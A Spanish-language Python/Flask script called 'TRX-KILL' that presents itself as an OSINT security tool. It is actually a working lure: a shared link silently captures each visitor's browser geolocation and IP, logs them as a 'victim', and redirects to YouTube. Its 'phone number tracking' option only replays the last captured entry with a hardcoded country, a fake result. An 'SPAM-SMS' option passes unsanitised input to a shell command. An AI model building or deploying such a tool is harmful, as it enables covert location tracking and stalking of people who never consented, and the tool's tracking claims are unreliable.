import os, sys, getpass, time, threading
from flask import Flask, request

app = Flask('TRX-KILL')
AUTH_PASS = "TRX-KILL-OSINT"
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"

if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

# --- SERVIDOR DE CAPTURA ---
@app.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://youtube.com';
        });
    </script></html>"""

@app.route('/log')
def log():
    lat = request.args.get('lat', '0')
    lon = request.args.get('lon', '0')
    ip = request.remote_addr
    with open(LOG_FILE, "a") as f:
        f.write(f"IP:{ip}|LAT:{lat}|LON:{lon}|NAME:VICTIMA_REGISTRADA\n")
    return "OK"

def banner():
    os.system('clear')
    print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
    print("  -HERRAMIENTA DE SEGURIDAD Y OSINT.")
    print("  -PROHIBIDO SU MAL USO.\n\033[0m")

def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
    
    while True:
        banner()
        print("  [1] RASTREAR NÚMERO | [2] LINK-ZP    | [3] CREADOR   | [4] VERSIONES")
        print("  [5] ANALIZAR LINK   | [6] ADM SISTEMA| [7] INFO      | [8] REPOSITORIO")
        print("  [9] PROCESOS        | [10] SPAM-SMS  | [0] SALIR")
        
        try:
            sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
            
            if sel == "1":
                num = input("\nINGRESA NÚMERO: ")
                print(f"\n[!] PROCESANDO RASTREO...")
                time.sleep(1)
                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                    with open(LOG_FILE, 'r') as f:
                        data = f.readlines()[-1].strip().split('|')
                        print(f"\n[+] DATOS LOCALIZADOS:")
                        print(f"PAÍS: ARGENTINA")
                        print(f"COORDENADAS: {data[1].replace('LAT:', '')}, {data[2].replace('LON:', '')}")
                        print(f"NAME REGISTRADO: {data[3].replace('NAME:', '')}")
                else: print("[!] ERROR: NO HAY ACTIVIDAD REGISTRADA.")
                input("\nPresiona Enter...")

            elif sel == "2":
                print("\n[!] SERVIDOR ACTIVO: http://127.0.0.1:5000")
                input("\n[!] COMPARTE EL LINK Y ESPERA... ENTER PARA VOLVER.")

            elif sel == "3": print("\n# CREADOR: OSCAR (TRX-KILL)"); input()
            elif sel == "4": print("\n# VERSIÓN: 1.4.5"); input()
            elif sel == "5": print("\n# ANALIZANDO..."); input()
            elif sel == "6":
                if input("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
                input()
            elif sel == "7": print("\n# SCRIPT DE SEGURIDAD."); input()
            elif sel == "8": print("\n# REPOSITORIO: PRIVADO"); input()
            elif sel == "9": print("\n# PROCESOS: SERVIDOR RUNNING"); input()
            elif sel == "10":
                n = input("NÚMERO: ")
                m = input("MENSAJE: ")
                os.system(f"termux-sms-send -n {n} '{m}'")
                print("[!] SMS ENVIADO."); input()
            elif sel == "0": sys.exit()
            
        except KeyboardInterrupt:
            continue

if __name__ == "__main__": main()
